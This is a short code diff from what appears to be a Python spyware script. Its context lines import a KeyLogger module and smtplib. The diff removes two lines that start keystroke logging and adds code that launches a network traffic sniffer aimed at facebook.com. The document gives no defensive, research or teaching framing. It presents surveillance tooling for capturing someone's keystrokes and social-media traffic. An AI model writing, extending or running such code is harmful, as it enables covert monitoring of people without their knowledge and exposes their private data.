@@ -2,7 +2,7 @@
 from KeyLogger import KeyLogger
 import smtplib
 import threading
-
-
-kl = KeyLogger(10, 30)
-kl.startLogging()
+from MonitorNetwork import NetworkTrafficAnalyzer
+domain_to_monitor = "facebook.com"  
+traffic_analyzer = NetworkTrafficAnalyzer(domain_to_monitor)
+traffic_analyzer.start_sniffing()
